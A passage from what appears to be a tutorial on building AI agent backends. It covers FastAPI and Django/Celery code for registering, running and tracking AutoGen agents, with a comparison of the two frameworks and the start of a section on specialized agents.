                "parameters": {
                    "temperature": 0.2,
                    "streaming": True
                }
            }
        )
        
        self.register_agent_type(
            "research_team",
            self._create_research_team,
            {
                "description": "Multi-agent team for in-depth research on complex topics",
                "parameters": {
                    "max_research_steps": 10,
                    "depth": "comprehensive",
                    "team_size": 3
                }
            }
        )
        
        # Load custom agent types from configuration if available
        self._load_custom_agent_types()
    
    def _load_custom_agent_types(self):
        """Load custom agent types from configuration."""
        custom_agents_path = self.settings.custom_agents_path
        if not custom_agents_path or not os.path.exists(custom_agents_path):
            logger.info("No custom agents configuration found")
            return
        
        try:
            with open(custom_agents_path, "r") as f:
                custom_agents = json.load(f)
            
            for agent_type, config in custom_agents.items():
                # Custom agents would need a factory method that interprets the config
                self.register_agent_type(
                    agent_type,
                    self._create_custom_agent,
                    config
                )
            
            logger.info(f"Loaded {len(custom_agents)} custom agent types")
        except Exception as e:
            logger.error(f"Error loading custom agents: {str(e)}", exc_info=True)
    
    def register_agent_type(self, agent_type: str, factory_func: callable, config: Dict[str, Any]):
        """Register a new agent type with its factory function and configuration."""
        self.agent_registry[agent_type] = factory_func
        self.agent_configs[agent_type] = config
        logger.info(f"Registered agent type: {agent_type}")
    
    def get_available_agent_types(self) -> List[Dict[str, Any]]:
        """Get a list of available agent types and their configurations."""
        return [
            {"agent_type": agent_type, **config}
            for agent_type, config in self.agent_configs.items()
        ]
    
    def generate_task_id(self) -> str:
        """Generate a unique task ID."""
        return f"task_{uuid.uuid4().hex}"
    
    async def execute_agent(
        self,
        agent_type: str,
        parameters: Dict[str, Any],
        user_id: Optional[str] = None,
    ) -> Dict[str, Any]:
        """Execute an agent synchronously and return the result."""
        if agent_type not in self.agent_registry:
            raise ValueError(f"Unknown agent type: {agent_type}")
        
        # Create agent instance
        agent_factory = self.agent_registry[agent_type]
        agent = agent_factory(parameters)
        
        # Execute agent
        try:
            result = await agent.execute(parameters)
            return result
        except Exception as e:
            logger.error(f"Error executing agent {agent_type}: {str(e)}", exc_info=True)
            raise
    
    async def execute_agent_task(
        self,
        task_id: str,
        agent_type: str,
        parameters: Dict[str, Any],
        user_id: Optional[str] = None,
    ):
        """Execute an agent as a background task and store the result."""
        # Initialize task status
        self.tasks[task_id] = AgentTask(
            task_id=task_id,
            agent_type=agent_type,
            status="processing",
            start_time=time.time(),
            parameters=parameters,
            user_id=user_id,
        )
        
        try:
            # Execute the agent
            result = await self.execute_agent(agent_type, parameters, user_id)
            
            # Update task with successful result
            self.tasks[task_id].status = "completed"
            self.tasks[task_id].end_time = time.time()
            self.tasks[task_id].result = result
            
        except Exception as e:
            # Update task with error
            self.tasks[task_id].status = "failed"
            self.tasks[task_id].end_time = time.time()
            self.tasks[task_id].error = str(e)
            logger.error(f"Task {task_id} failed: {str(e)}", exc_info=True)
    
    def get_task_status(self, task_id: str) -> Optional[AgentResponse]:
        """Get the status of a task by ID."""
        if task_id not in self.tasks:
            return None
        
        task = self.tasks[task_id]
        
        if task.status == "completed":
            return AgentResponse(
                status="completed",
                task_id=task_id,
                result=task.result,
                message="Task completed successfully",
                execution_time=task.end_time - task.start_time if task.end_time else None,
            )
        elif task.status == "failed":
            return AgentResponse(
                status="failed",
                task_id=task_id,
                error=task.error,
                message="Task execution failed",
                execution_time=task.end_time - task.start_time if task.end_time else None,
            )
        else:
            return AgentResponse(
                status="processing",
                task_id=task_id,
                message="Task is still processing",
                execution_time=time.time() - task.start_time if task.start_time else None,
            )
    
    # Agent factory methods
    
    def _create_general_assistant(self, parameters: Dict[str, Any]):
        """Create a general-purpose assistant agent."""
        temperature = parameters.get("temperature", 0.7)
        
        return GeneralAssistantAgent(
            name="GeneralAssistant",
            llm_config={
                "config_list": self.settings.get_llm_config_list(),
                "temperature": temperature,
            }
        )
    
    def _create_code_assistant(self, parameters: Dict[str, Any]):
        """Create a code-specialized assistant agent."""
        temperature = parameters.get("temperature", 0.2)
        
        return CodeAssistantAgent(
            name="CodeAssistant",
            llm_config={
                "config_list": self.settings.get_llm_config_list(),
                "temperature": temperature,
            }
        )
    
    def _create_research_team(self, parameters: Dict[str, Any]):
        """Create a multi-agent research team."""
        return ResearchTeamAgentGroup(
            config_list=self.settings.get_llm_config_list(),
            parameters=parameters
        )
    
    def _create_custom_agent(self, parameters: Dict[str, Any]):
        """Create a custom agent based on configuration."""
        # Implementation would depend on how custom agents are defined
        agent_config = parameters.get("agent_config", {})
        
        if agent_config.get("type") == "assistant":
            return GeneralAssistantAgent(
                name=agent_config.get("name", "CustomAssistant"),
                llm_config={
                    "config_list": self.settings.get_llm_config_list(),
                    "temperature": agent_config.get("temperature", 0.7),
                }
            )
        elif agent_config.get("type") == "multi_agent":
            # Create a multi-agent system
            return CustomMultiAgentSystem(
                config_list=self.settings.get_llm_config_list(),
                parameters=agent_config
            )
        else:
            raise ValueError(f"Unknown custom agent type: {agent_config.get('type')}")


# Example agent implementations

class GeneralAssistantAgent:
    """General-purpose assistant agent implementation."""
    
    def __init__(self, name: str, llm_config: Dict[str, Any]):
        self.name = name
        self.llm_config = llm_config
        self.agent = autogen.AssistantAgent(
            name=name,
            system_message="You are a helpful AI assistant that provides informative, accurate, and thoughtful responses.",
            llm_config=llm_config
        )
    
    async def execute(self, parameters: Dict[str, Any]) -> Dict[str, Any]:
        """Execute the agent with the given parameters."""
        user_message = parameters.get("message", "")
        if not user_message:
            raise ValueError("No message provided for the agent")
        
        user_proxy = autogen.UserProxyAgent(
            name="user_proxy",
            human_input_mode="NEVER",
            max_consecutive_auto_reply=0,
        )
        
        # Start the conversation
        user_proxy.initiate_chat(
            self.agent,
            message=user_message
        )
        
        # Extract the response
        last_message = None
        for message in reversed(user_proxy.chat_history):
            if message["role"] == "assistant":
                last_message = message
                break
        
        if not last_message:
            raise RuntimeError("No response received from agent")
        
        return {
            "response": last_message["content"],
            "agent_name": self.name,
            "chat_history": user_proxy.chat_history
        }


class CodeAssistantAgent:
    """Code-specialized assistant agent implementation."""
    
    def __init__(self, name: str, llm_config: Dict[str, Any]):
        self.name = name
        self.llm_config = llm_config
        self.agent = autogen.AssistantAgent(
            name=name,
            system_message="""You are a skilled coding assistant with expertise in software development.
            You provide accurate, efficient, and well-explained code solutions.
            When writing code, focus on best practices, performance, and readability.
            Explain your code so users understand the implementation.""",
            llm_config=llm_config
        )
    
    async def execute(self, parameters: Dict[str, Any]) -> Dict[str, Any]:
        """Execute the agent with the given parameters."""
        user_message = parameters.get("message", "")
        if not user_message:
            raise ValueError("No message provided for the agent")
        
        # Allow code execution if specifically enabled
        code_execution = parameters.get("code_execution", False)
        
        user_proxy = autogen.UserProxyAgent(
            name="user_proxy",
            human_input_mode="NEVER",
            max_consecutive_auto_reply=0,
            code_execution_config={"work_dir": "coding_workspace"} if code_execution else None
        )
        
        # Start the conversation
        user_proxy.initiate_chat(
            self.agent,
            message=user_message
        )
        
        # Extract the response
        last_message = None
        for message in reversed(user_proxy.chat_history):
            if message["role"] == "assistant":
                last_message = message
                break
        
        if not last_message:
            raise RuntimeError("No response received from agent")
        
        return {
            "response": last_message["content"],
            "agent_name": self.name,
            "chat_history": user_proxy.chat_history,
            "code_blocks": self._extract_code_blocks(last_message["content"])
        }
    
    def _extract_code_blocks(self, text: str) -> List[Dict[str, str]]:
        """Extract code blocks from a markdown text."""
        import re
        
        code_blocks = []
        pattern = r'```(\w*)\n(.*?)```'
        matches = re.findall(pattern, text, re.DOTALL)
        
        for language, code in matches:
            code_blocks.append({
                "language": language.strip() or "plaintext",
                "code": code.strip()
            })
        
        return code_blocks


class ResearchTeamAgentGroup:
    """Multi-agent research team implementation."""
    
    def __init__(self, config_list: List[Dict[str, Any]], parameters: Dict[str, Any]):
        self.config_list = config_list
        self.parameters = parameters
        
        # Configure the team size and roles
        self.team_size = parameters.get("team_size", 3)
        
        # Initialize base LLM config
        self.base_llm_config = {
            "config_list": config_list,
            "temperature": 0.5,
        }
    
    async def execute(self, parameters: Dict[str, Any]) -> Dict[str, Any]:
        """Execute the research team with the given parameters."""
        topic = parameters.get("topic", "")
        if not topic:
            raise ValueError("No research topic provided")
        
        depth = parameters.get("depth", "comprehensive")
        max_steps = parameters.get("max_research_steps", 10)
        
        # Create the research team
        researcher = autogen.AssistantAgent(
            name="Researcher",
            system_message="""You are an expert researcher who excels at finding information
            and breaking down complex topics. Your role is to gather relevant information,
            identify key questions, and organize research findings.""",
            llm_config=self.base_llm_config
        )
        
        analyst = autogen.AssistantAgent(
            name="Analyst",
            system_message="""You are an expert analyst who excels at interpreting information,
            identifying patterns, and drawing insightful conclusions. Your role is to analyze
            the research findings, evaluate evidence, and provide reasoned interpretations.""",
            llm_config=self.base_llm_config
        )
        
        critic = autogen.AssistantAgent(
            name="Critic",
            system_message="""You are an expert critic who excels at identifying weaknesses,
            biases, and gaps in research and analysis. Your role is to critique the research
            and analysis, point out limitations, and suggest improvements.""",
            llm_config=self.base_llm_config
        )
        
        # Create user proxy to coordinate the team
        user_proxy = autogen.UserProxyAgent(
            name="ResearchCoordinator",
            human_input_mode="NEVER",
            max_consecutive_auto_reply=max_steps,
            system_message="""You are coordinating a research project.
            Your role is to guide the research team, track progress, and
            ensure the final output addresses the research topic completely."""
        )
        
        # Create group chat for the team
        groupchat = autogen.GroupChat(
            agents=[user_proxy, researcher, analyst, critic],
            messages=[],
            max_round=max_steps
        )
        
        manager = autogen.GroupChatManager(
            groupchat=groupchat,
            llm_config=self.base_llm_config
        )
        
        # Start the research process
        research_prompt = f"""
        Research Topic: {topic}
        
        Research Depth: {depth}
        
        Please conduct a thorough research project on this topic following these steps:
        
        1. The Researcher should first explore the topic, identify key questions, and gather relevant information.
        2. The Analyst should then interpret the findings, identify patterns, and draw conclusions.
        3. The Critic should evaluate the research and analysis, identify limitations, and suggest improvements.
        4. Iterate on this process until a comprehensive understanding is achieved.
        5. Provide a final research report that includes:
           - Executive Summary
           - Key Findings
           - Analysis and Interpretation
           - Limitations and Gaps
           - Conclusions and Implications
        """
        
        # Initiate the chat
        user_proxy.initiate_chat(
            manager,
            message=research_prompt
        )
        
        # Process the results
        chat_history = user_proxy.chat_history
        
        # Extract the final research report
        final_report = None
        for message in reversed(chat_history):
            # Look for the last comprehensive message from any assistant
            if message["role"] == "assistant" and len(message["content"]) > 1000:
                final_report = message["content"]
                break
        
        return {
            "topic": topic,
            "depth": depth,
            "report": final_report,
            "chat_history": chat_history,
            "team_members": ["Researcher", "Analyst", "Critic"]
        }


class CustomMultiAgentSystem:
    """Custom implementation of a multi-agent system based on configuration."""
    
    def __init__(self, config_list: List[Dict[str, Any]], parameters: Dict[str, Any]):
        self.config_list = config_list
        self.parameters = parameters
    
    async def execute(self, parameters: Dict[str, Any]) -> Dict[str, Any]:
        """Execute the custom multi-agent system."""
        # This would be implemented based on the specific requirements
        # of the custom multi-agent system configuration
        raise NotImplementedError("Custom multi-agent systems are not yet implemented")
```

**Django Backend for AI Agents**

Django offers a more structured approach with built-in admin interfaces, ORM, and a comprehensive framework for building complex applications.

```python
# models.py
from django.db import models
from django.contrib.auth.models import User
import uuid
import json

class AgentType(models.Model):
    """Model representing different types of AI agents available in the system."""
    name = models.CharField(max_length=100, unique=True)
    description = models.TextField()
    parameters_schema = models.JSONField(default=dict)
    is_active = models.BooleanField(default=True)
    created_at = models.DateTimeField(auto_now_add=True)
    updated_at = models.DateTimeField(auto_now=True)
    
    def __str__(self):
        return self.name

class AgentExecution(models.Model):
    """Model for tracking agent execution jobs."""
    STATUS_CHOICES = (
        ('pending', 'Pending'),
        ('running', 'Running'),
        ('completed', 'Completed'),
        ('failed', 'Failed'),
        ('canceled', 'Canceled'),
    )
    
    id = models.UUIDField(primary_key=True, default=uuid.uuid4, editable=False)
    user = models.ForeignKey(User, on_delete=models.CASCADE, related_name='agent_executions')
    agent_type = models.ForeignKey(AgentType, on_delete=models.CASCADE)
    
    status = models.CharField(max_length=20, choices=STATUS_CHOICES, default='pending')
    parameters = models.JSONField(default=dict)
    result = models.JSONField(null=True, blank=True)
    error_message = models.TextField(null=True, blank=True)
    
    created_at = models.DateTimeField(auto_now_add=True)
    started_at = models.DateTimeField(null=True, blank=True)
    completed_at = models.DateTimeField(null=True, blank=True)
    
    priority = models.IntegerField(default=0)
    celery_task_id = models.CharField(max_length=255, null=True, blank=True)
    
    # Performance metrics
    execution_time = models.FloatField(null=True, blank=True)
    tokens_used = models.IntegerField(null=True, blank=True)
    
    class Meta:
        ordering = ['-created_at']
        indexes = [
            models.Index(fields=['user', 'status']),
            models.Index(fields=['agent_type', 'status']),
        ]
    
    def __str__(self):
        return f"{self.agent_type} execution by {self.user.username} ({self.status})"

class AgentFeedback(models.Model):
    """Model for storing user feedback on agent executions."""
    RATING_CHOICES = (
        (1, '1 - Poor'),
        (2, '2 - Fair'),
        (3, '3 - Good'),
        (4, '4 - Very Good'),
        (5, '5 - Excellent'),
    )
    
    execution = models.ForeignKey(AgentExecution, on_delete=models.CASCADE, related_name='feedback')
    user = models.ForeignKey(User, on_delete=models.CASCADE)
    
    rating = models.IntegerField(choices=RATING_CHOICES)
    comments = models.TextField(null=True, blank=True)
    created_at = models.DateTimeField(auto_now_add=True)
    
    class Meta:
        unique_together = ('execution', 'user')
        ordering = ['-created_at']
    
    def __str__(self):
        return f"Feedback on {self.execution} by {self.user.username}"

class AgentConversation(models.Model):
    """Model for persistent conversations with agents."""
    id = models.UUIDField(primary_key=True, default=uuid.uuid4, editable=False)
    user = models.ForeignKey(User, on_delete=models.CASCADE, related_name='agent_conversations')
    agent_type = models.ForeignKey(AgentType, on_delete=models.CASCADE)
    
    title = models.CharField(max_length=255)
    is_active = models.BooleanField(default=True)
    created_at = models.DateTimeField(auto_now_add=True)
    updated_at = models.DateTimeField(auto_now=True)
    
    metadata = models.JSONField(default=dict, blank=True)
    
    class Meta:
        ordering = ['-updated_at']
    
    def __str__(self):
        return f"{self.title} ({self.agent_type})"

class ConversationMessage(models.Model):
    """Model for messages within a conversation."""
    MESSAGE_ROLE_CHOICES = (
        ('user', 'User'),
        ('assistant', 'Assistant'),
        ('system', 'System'),
    )
    
    conversation = models.ForeignKey(AgentConversation, on_delete=models.CASCADE, related_name='messages')
    role = models.CharField(max_length=10, choices=MESSAGE_ROLE_CHOICES)
    content = models.TextField()
    
    created_at = models.DateTimeField(auto_now_add=True)
    tokens = models.IntegerField(default=0)
    
    metadata = models.JSONField(default=dict, blank=True)
    
    class Meta:
        ordering = ['created_at']
    
    def __str__(self):
        return f"{self.role} message in {self.conversation}"
```

```python
# serializers.py
from rest_framework import serializers
from .models import AgentType, AgentExecution, AgentFeedback, AgentConversation, ConversationMessage
from django.contrib.auth.models import User

class UserSerializer(serializers.ModelSerializer):
    class Meta:
        model = User
        fields = ['id', 'username', 'email', 'first_name', 'last_name']
        read_only_fields = fields

class AgentTypeSerializer(serializers.ModelSerializer):
    class Meta:
        model = AgentType
        fields = ['id', 'name', 'description', 'parameters_schema', 'is_active']
        read_only_fields = ['id', 'created_at', 'updated_at']

class AgentExecutionSerializer(serializers.ModelSerializer):
    user = UserSerializer(read_only=True)
    agent_type = AgentTypeSerializer(read_only=True)
    agent_type_id = serializers.PrimaryKeyRelatedField(
        queryset=AgentType.objects.all(),
        write_only=True,
        source='agent_type'
    )
    
    class Meta:
        model = AgentExecution
        fields = [
            'id', 'user', 'agent_type', 'agent_type_id', 'status',
            'parameters', 'result', 'error_message', 'created_at',
            'started_at', 'completed_at', 'execution_time', 'tokens_used',
            'priority', 'celery_task_id'
        ]
        read_only_fields = [
            'id', 'user', 'status', 'result', 'error_message', 'created_at',
            'started_at', 'completed_at', 'execution_time', 'tokens_used',
            'celery_task_id'
        ]
    
    def create(self, validated_data):
        # Set the user from the request
        user = self.context['request'].user
        validated_data['user'] = user
        return super().create(validated_data)

class AgentFeedbackSerializer(serializers.ModelSerializer):
    user = UserSerializer(read_only=True)
    
    class Meta:
        model = AgentFeedback
        fields = ['id', 'execution', 'user', 'rating', 'comments', 'created_at']
        read_only_fields = ['id', 'user', 'created_at']
    
    def create(self, validated_data):
        # Set the user from the request
        user = self.context['request'].user
        validated_data['user'] = user
        return super().create(validated_data)

class ConversationMessageSerializer(serializers.ModelSerializer):
    class Meta:
        model = ConversationMessage
        fields = ['id', 'conversation', 'role', 'content', 'created_at', 'tokens', 'metadata']
        read_only_fields = ['id', 'created_at', 'tokens']

class AgentConversationSerializer(serializers.ModelSerializer):
    user = UserSerializer(read_only=True)
    agent_type = AgentTypeSerializer(read_only=True)
    agent_type_id = serializers.PrimaryKeyRelatedField(
        queryset=AgentType.objects.all(),
        write_only=True,
        source='agent_type'
    )
    messages = ConversationMessageSerializer(many=True, read_only=True)
    
    class Meta:
        model = AgentConversation
        fields = [
            'id', 'user', 'agent_type', 'agent_type_id', 'title', 
            'is_active', 'created_at', 'updated_at', 'metadata', 'messages'
        ]
        read_only_fields = ['id', 'user', 'created_at', 'updated_at']
    
    def create(self, validated_data):
        # Set the user from the request
        user = self.context['request'].user
        validated_data['user'] = user
        return super().create(validated_data)

class MessageCreateSerializer(serializers.Serializer):
    """Serializer for creating a new message and getting agent response."""
    conversation_id = serializers.UUIDField()
    content = serializers.CharField()
    metadata = serializers.JSONField(required=False)
    
    def validate_conversation_id(self, value):
        try:
            conversation = AgentConversation.objects.get(id=value)
            if conversation.user != self.context['request'].user:
                raise serializers.ValidationError("Conversation does not belong to the current user")
            return value
        except AgentConversation.DoesNotExist:
            raise serializers.ValidationError("Conversation does not exist")
```

```python
# views.py
from rest_framework import viewsets, status, permissions
from rest_framework.decorators import action
from rest_framework.response import Response
from django.utils import timezone
from django.db import transaction
from django_celery_results.models import TaskResult

from .models import AgentType, AgentExecution, AgentFeedback, AgentConversation, ConversationMessage
from .serializers import (
    AgentTypeSerializer, AgentExecutionSerializer, AgentFeedbackSerializer,
    AgentConversationSerializer, ConversationMessageSerializer, MessageCreateSerializer
)
from .tasks import execute_agent_task, process_agent_message
from .agents import get_agent_registry

class AgentTypeViewSet(viewsets.ReadOnlyModelViewSet):
    """ViewSet for listing available agent types."""
    queryset = AgentType.objects.filter(is_active=True)
    serializer_class = AgentTypeSerializer
    permission_classes = [permissions.IsAuthenticated]
    
    @action(detail=True, methods=['get'])
    def parameters_schema(self, request, pk=None):
        """Get the parameters schema for an agent type."""
        agent_type = self.get_object()
        return Response(agent_type.parameters_schema)

class AgentExecutionViewSet(viewsets.ModelViewSet):
    """ViewSet for managing agent executions."""
    serializer_class = AgentExecutionSerializer
    permission_classes = [permissions.IsAuthenticated]
    
    def get_queryset(self):
        """Return executions for the current user."""
        return AgentExecution.objects.filter(user=self.request.user)
    
    def create(self, request, *args, **kwargs):
        """Create a new agent execution and queue the task."""
        serializer = self.get_serializer(data=request.data)
        serializer.is_valid(raise_exception=True)
        
        # Create the execution record
        with transaction.atomic():
            execution = serializer.save()
            execution.status = 'pending'
            execution.save()
            
            # Queue the task
            task = execute_agent_task.delay(str(execution.id))
            execution.celery_task_id = task.id
            execution.save()
        
        headers = self.get_success_headers(serializer.data)
        return Response(serializer.data, status=status.HTTP_201_CREATED, headers=headers)
    
    @action(detail=True, methods=['post'])
    def cancel(self, request, pk=None):
        """Cancel a running execution."""
        execution = self.get_object()
        
        if execution.status not in ['pending', 'running']:
            return Response(
                {"detail": "Only pending or running executions can be canceled."},
                status=status.HTTP_400_BAD_REQUEST
            )
        
        # Revoke the Celery task
        if execution.celery_task_id:
            from celery.task.control import revoke
            revoke(execution.celery_task_id, terminate=True)
        
        # Update execution status
        execution.status = 'canceled'
        execution.completed_at = timezone.now()
        execution.save()
        
        serializer = self.get_serializer(execution)
        return Response(serializer.data)
    
    @action(detail=True, methods=['post'])
    def feedback(self, request, pk=None):
        """Add feedback for an execution."""
        execution = self.get_object()
        
        # Check if execution is completed
        if execution.status != 'completed':
            return Response(
                {"detail": "Feedback can only be provided for completed executions."},
                status=status.HTTP_400_BAD_REQUEST
            )
        
        # Create or update feedback
        feedback_data = {
            'execution': execution.id,
            'rating': request.data.get('rating'),
            'comments': request.data.get('comments', '')
        }
        
        # Check if feedback already exists
        try:
            feedback = AgentFeedback.objects.get(execution=execution, user=request.user)
            feedback_serializer = AgentFeedbackSerializer(
                feedback, data=feedback_data, context={'request': request}
            )
        except AgentFeedback.DoesNotExist:
            feedback_serializer = AgentFeedbackSerializer(
                data=feedback_data, context={'request': request}
            )
        
        feedback_serializer.is_valid(raise_exception=True)
        feedback_serializer.save()
        
        return Response(feedback_serializer.data)

class ConversationViewSet(viewsets.ModelViewSet):
    """ViewSet for managing agent conversations."""
    serializer_class = AgentConversationSerializer
    permission_classes = [permissions.IsAuthenticated]
    
    def get_queryset(self):
        """Return conversations for the current user."""
        return AgentConversation.objects.filter(user=self.request.user)
    
    @action(detail=True, methods=['post'])
    def send_message(self, request, pk=None):
        """Send a new message and get the agent's response."""
        conversation = self.get_object()
        
        # Ensure conversation is active
        if not conversation.is_active:
            return Response(
                {"detail": "This conversation is no longer active."},
                status=status.HTTP_400_BAD_REQUEST
            )
        
        # Validate message data
        serializer = MessageCreateSerializer(
            data={'conversation_id': str(conversation.id), **request.data},
            context={'request': request}
        )
        serializer.is_valid(raise_exception=True)
        
        # Create user message
        content = serializer.validated_data['content']
        metadata = serializer.validated_data.get('metadata', {})
        
        user_message = ConversationMessage.objects.create(
            conversation=conversation,
            role='user',
            content=content,
            metadata=metadata
        )
        
        # Update conversation timestamp
        conversation.updated_at = timezone.now()
        conversation.save()
        
        # Process message asynchronously
        task = process_agent_message.delay(
            conversation_id=str(conversation.id),
            message_id=str(user_message.id)
        )
        
        # Return the user message and task ID
        return Response({
            'message': ConversationMessageSerializer(user_message).data,
            'task_id': task.id,
            'status': 'processing'
        })
    
    @action(detail=True, methods=['get'])
    def messages(self, request, pk=None):
        """Get all messages in a conversation."""
        conversation = self.get_object()
        messages = conversation.messages.all()
        
        # Handle pagination
        page = self.paginate_queryset(messages)
        if page is not None:
            serializer = ConversationMessageSerializer(page, many=True)
            return self.get_paginated_response(serializer.data)
        
        serializer = ConversationMessageSerializer(messages, many=True)
        return Response(serializer.data)
    
    @action(detail=True, methods=['post'])
    def archive(self, request, pk=None):
        """Archive a conversation."""
        conversation = self.get_object()
        conversation.is_active = False
        conversation.save()
        
        serializer = self.get_serializer(conversation)
        return Response(serializer.data)
```

```python
# tasks.py
import time
import logging
from celery import shared_task
from django.utils import timezone
from django.db import transaction

logger = logging.getLogger(__name__)

@shared_task(bind=True, max_retries=3, default_retry_delay=60)
def execute_agent_task(self, execution_id):
    """Execute an agent task asynchronously."""
    from .models import AgentExecution
    from .agents import get_agent_registry
    
    logger.info(f"Starting agent execution {execution_id}")
    
    try:
        # Get the execution
        execution = AgentExecution.objects.get(id=execution_id)
        
        # Update status to running
        execution.status = 'running'
        execution.started_at = timezone.now()
        execution.save()
        
        # Get the agent registry
        agent_registry = get_agent_registry()
        
        # Get the agent factory
        agent_type_name = execution.agent_type.name
        if agent_type_name not in agent_registry:
            raise ValueError(f"Unknown agent type: {agent_type_name}")
        
        agent_factory = agent_registry[agent_type_name]
        
        # Create the agent
        agent = agent_factory(execution.parameters)
        
        # Start timing
        start_time = time.time()
        
        # Execute the agent
        result = agent.execute(execution.parameters)
        
        # Calculate execution time
        execution_time = time.time() - start_time
        
        # Update execution with results
        execution.status = 'completed'
        execution.result = result
        execution.completed_at = timezone.now()
        execution.execution_time = execution_time
        
        # Extract token usage if available
        if 'token_usage' in result:
            execution.tokens_used = result['token_usage'].get('total_tokens', 0)
        
        execution.save()
        
        logger.info(f"Completed agent execution {execution_id}")
        return {'execution_id': execution_id, 'status': 'completed'}
        
    except Exception as e:
        logger.exception(f"Error executing agent {execution_id}: {str(e)}")
        
        try:
            # Update execution with error
            execution = AgentExecution.objects.get(id=execution_id)
            execution.status = 'failed'
            execution.error_message = str(e)
            execution.completed_at = timezone.now()
            execution.save()
        except Exception as inner_e:
            logger.exception(f"Error updating execution status: {str(inner_e)}")
        
        # Retry for certain errors
        if 'Rate limit' in str(e) or 'timeout' in str(e).lower():
            raise self.retry(exc=e)
        
        return {'execution_id': execution_id, 'status': 'failed', 'error': str(e)}

@shared_task(bind=True, max_retries=2)
def process_agent_message(self, conversation_id, message_id):
    """Process a message in a conversation and generate agent response."""
    from .models import AgentConversation, ConversationMessage
    from .agents import get_agent_registry
    
    logger.info(f"Processing message {message_id} in conversation {conversation_id}")
    
    try:
        # Get the conversation and message
        conversation = AgentConversation.objects.get(id=conversation_id)
        message = ConversationMessage.objects.get(id=message_id, conversation=conversation)
        
        # Get recent conversation history (last 10 messages)
        history = list(conversation.messages.order_by('-created_at')[:10])
        history.reverse()  # Chronological order
        
        # Format history for the agent
        formatted_history = []
        for msg in history:
            if msg.id != message.id:  # Skip the current message
                formatted_history.append({
                    'role': msg.role,
                    'content': msg.content
                })
        
        # Get the agent registry
        agent_registry = get_agent_registry()
        
        # Get the agent factory
        agent_type_name = conversation.agent_type.name
        if agent_type_name not in agent_registry:
            raise ValueError(f"Unknown agent type: {agent_type_name}")
        
        agent_factory = agent_registry[agent_type_name]
        
        # Create the agent
        agent = agent_factory({})
        
        # Generate response
        response = agent.generate_response(
            message=message.content,
            history=formatted_history,
            metadata=conversation.metadata
        )
        
        # Create response message
        with transaction.atomic():
            agent_message = ConversationMessage.objects.create(
                conversation=conversation,
                role='assistant',
                content=response['content'],
                tokens=response.get('tokens', 0),
                metadata=response.get('metadata', {})
            )
            
            # Update conversation timestamp
            conversation.updated_at = timezone.now()
            conversation.save()
        
        logger.info(f"Created response message {agent_message.id} in conversation {conversation_id}")
        return {
            'conversation_id': conversation_id,
            'message_id': str(message.id),
            'response_id': str(agent_message.id),
            'status': 'completed'
        }
        
    except Exception as e:
        logger.exception(f"Error processing message {message_id}: {str(e)}")
        
        try:
            # Create error message
            error_message = f"I'm sorry, I encountered an error processing your message: {str(e)}"
            
            ConversationMessage.objects.create(
                conversation_id=conversation_id,
                role='system',
                content=error_message
            )
        except Exception as inner_e:
            logger.exception(f"Error creating error message: {str(inner_e)}")
        
        # Retry for certain errors
        if 'Rate limit' in str(e) or 'timeout' in str(e).lower():
            raise self.retry(exc=e)
        
        return {
            'conversation_id': conversation_id,
            'message_id': message_id,
            'status': 'failed',
            'error': str(e)
        }
```

```python
# urls.py
from django.urls import path, include
from rest_framework.routers import DefaultRouter
from . import views

router = DefaultRouter()
router.register(r'agent-types', views.AgentTypeViewSet, basename='agent-type')
router.register(r'executions', views.AgentExecutionViewSet, basename='execution')
router.register(r'conversations', views.ConversationViewSet, basename='conversation')

urlpatterns = [
    path('', include(router.urls)),
]
```

**Key Differences Between FastAPI and Django for AI Agent Systems:**

1. **Setup Complexity**:
   - FastAPI: Lightweight, modular, setup only what you need
   - Django: Comprehensive framework with more initial setup but comes with many built-in features

2. **Performance**:
   - FastAPI: Built for high-performance async processing, ideal for agent-based systems with many concurrent requests
   - Django: Traditionally synchronous (though supports async), slightly more overhead but still handles high loads

3. **Database Access**:
   - FastAPI: Flexible - use any ORM or direct database access
   - Django: Built-in ORM with powerful query capabilities and migrations

4. **Admin Interface**:
   - FastAPI: Requires custom implementation
   - Django: Comes with a powerful admin interface out of the box

5. **Authentication and Security**:
   - FastAPI: Requires manual implementation or third-party libraries
   - Django: Comprehensive built-in authentication and security features

6. **Scaling Strategy**:
   - FastAPI: Often deployed with multiple instances behind a load balancer
   - Django: Similar scaling approach, but with more consideration for database connections

### Configuring AutoGen for Multi-Agent Interactions

AutoGen provides a powerful framework for creating multi-agent interactions where specialized agents collaborate to solve complex problems. Here's a comprehensive guide to configuring AutoGen for sophisticated agent systems:

**1. Defining Specialized Agents**

```python
# agent_framework/specialized_agents.py
import autogen
from typing import Dict, List, Any, Optional

class SpecializedAgentFactory:
    """Factory for creating specialized agents with specific capabilities."""
    
    def __init__(self, llm_config: Dict[str, Any]):
        """Initialize with base LLM configuration."""
        self.llm_config = llm_config
    
    def create_research_agent(self) -> autogen.AssistantAgent:
        """Create a research specialist agent."""
        return autogen.AssistantAgent(
            name="ResearchAgent",
            system_message="""You are a research specialist who excels at gathering comprehensive information.
            
            Your capabilities:
            1. Finding detailed information on complex topics
            2. Identifying key points and summarizing research findings
            3. Evaluating the reliability and credibility of sources
            4. Organizing information in a structured way
            5. Identifying knowledge gaps that require further research
            
            When conducting research:
            - Start by understanding the core question and breaking it into sub-questions
            - Consider multiple perspectives and potential biases
            - Cite sources and distinguish between facts and inferences
            - Organize findings in a logical structure
            - Highlight confidence levels in different pieces of information
            """,
            llm_config=self.llm_config
        )
    
    def create_reasoning_agent(self) -> autogen.AssistantAgent:
        """Create a reasoning and analysis specialist agent."""
        return autogen.AssistantAgent(
            name="ReasoningAgent",
            system_message="""You are a reasoning and analysis specialist with exceptional critical thinking.
            
            Your capabilities:
            1. Analyzing complex problems and breaking them down systematically
            2. Identifying logical fallacies and cognitive biases
            3. Weighing evidence and evaluating arguments
            4. Drawing sound conclusions based on available information
            5. Considering alternative explanations and counterfactuals
            
            When analyzing problems:
            - Clarify the core problem and relevant considerations
            - Identify assumptions and evaluate their validity
            - Consider multiple perspectives and approaches
            - Look for logical inconsistencies and gaps in reasoning
            - Develop structured arguments with clear logical flow
            """,
            llm_config=self.llm_config
        )
    
    def create_coding_agent(self) -> autogen.AssistantAgent:
        """Create a coding specialist agent."""
        coding_config = self.llm_config.copy()
        coding_config["temperature"] = min(coding_config.get("temperature", 0.7), 0.3)
        
        return autogen.AssistantAgent(
            name="CodingAgent",
            system_message="""You are a coding specialist who excels at software development and implementation.
            
            Your capabilities:
            1. Writing clean, efficient, and maintainable code
            2. Debugging and solving technical problems
            3. Designing software solutions for specific requirements
            4. Explaining code functionality and design decisions
            5. Optimizing code for performance and readability
            
            When writing code:
